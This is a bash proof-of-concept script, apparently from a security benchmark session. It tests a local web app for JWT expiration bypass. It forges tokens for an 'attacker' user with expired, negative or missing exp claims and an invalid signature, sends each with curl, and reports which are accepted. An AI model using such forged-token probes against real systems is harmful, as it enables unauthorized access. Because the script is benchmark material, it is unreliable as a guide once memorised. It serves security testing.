#!/bin/bash
# POC: Demonstrates JWT expiration bypass vulnerability by testing expired, invalid, and missing expiration claims
# Target: ./repo
# Created: 2025-11-07T16:17:40.055Z
# Session: benchmark-XBEN-084-24-mhp1efma

# JWT Expiration Bypass POC
# Tests whether the application validates JWT token expiration claims
# Expected: All invalid expiration tokens should be rejected
# Actual: All tokens are accepted regardless of expiration validity

TARGET="http://localhost:3000/s3/gold"

echo "[*] JWT Expiration Bypass Vulnerability Test"
echo "[*] Target: $TARGET"
echo ""

# Helper function to create a simple JWT-like token
# Note: In real scenario, these would be valid JWT tokens with different exp claims
create_jwt() {
    local exp=$1
    local claim_desc=$2
    
    # Create a basic JWT-like structure for testing
    # Header.Payload.Signature
    # Using base64 encoded payload with specific exp claim
    
    local header='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'  # {"alg":"HS256","typ":"JWT"}
    
    # Create payload with specified exp claim
    # Payload varies based on exp value
    if [ "$exp" == "missing" ]; then
        # Payload without exp claim: {"user":"attacker","iat":1234567890}
        local payload='eyJ1c2VyIjoiYXR0YWNrZXIiLCJpYXQiOjEyMzQ1Njc4OTB9'
    else
        # Payload with exp claim
        # This represents: {"user":"attacker","exp":<value>}
        local payload=$(echo -n "{\"user\":\"attacker\",\"exp\":$exp}" | base64 -w 0)
    fi
    
    local signature='invalid_signature_acceptance_test'
    
    echo "${header}.${payload}.${signature}"
}

# Test 1: Expired token (exp=1, issued in 1970)
echo "[TEST 1] Expired Token (exp=1, issued in 1970)"
EXPIRED_TOKEN=$(create_jwt 1 "expired_1970")
RESPONSE=$(curl -s -w "\n%{http_code}" -H "x-auth-token: $EXPIRED_TOKEN" -H "x-user-id: attacker" "$TARGET")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "Token: $EXPIRED_TOKEN"
echo "HTTP Response: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "Result: VULNERABLE ✓ (Expired token was ACCEPTED)"
else
    echo "Result: PROTECTED (Expired token was REJECTED)"
fi
echo ""

# Test 2: Negative expiration (exp=-1)
echo "[TEST 2] Negative Expiration (exp=-1)"
NEGATIVE_TOKEN=$(create_jwt -1 "negative_exp")
RESPONSE=$(curl -s -w "\n%{http_code}" -H "x-auth-token: $NEGATIVE_TOKEN" -H "x-user-id: attacker" "$TARGET")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "Token: $NEGATIVE_TOKEN"
echo "HTTP Response: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "Result: VULNERABLE ✓ (Negative exp was ACCEPTED)"
else
    echo "Result: PROTECTED (Negative exp was REJECTED)"
fi
echo ""

# Test 3: No expiration claim
echo "[TEST 3] Missing Expiration Claim"
MISSING_EXP_TOKEN=$(create_jwt "missing" "no_exp_claim")
RESPONSE=$(curl -s -w "\n%{http_code}" -H "x-auth-token: $MISSING_EXP_TOKEN" -H "x-user-id: attacker" "$TARGET")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "Token: $MISSING_EXP_TOKEN"
echo "HTTP Response: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "Result: VULNERABLE ✓ (Missing exp claim was ACCEPTED)"
else
    echo "Result: PROTECTED (Missing exp claim was REJECTED)"
fi
echo ""

# Test 4: Valid future expiration (2099)
echo "[TEST 4] Valid Future Expiration (exp=4070908800, year 2099)"
FUTURE_TOKEN=$(create_jwt 4070908800 "future_2099")
RESPONSE=$(curl -s -w "\n%{http_code}" -H "x-auth-token: $FUTURE_TOKEN" -H "x-user-id: attacker" "$TARGET")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "Token: $FUTURE_TOKEN"
echo "HTTP Response: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "Result: ACCEPTED (Future token accepted as expected)"
else
    echo "Result: REJECTED"
fi
echo ""

echo "[*] Summary:"
echo "If all tests show HTTP 200, expiration validation is NOT implemented."
echo "The application accepts tokens regardless of exp claim validity."
echo "[*] Vulnerability: JWT Expiration Bypass Confirmed"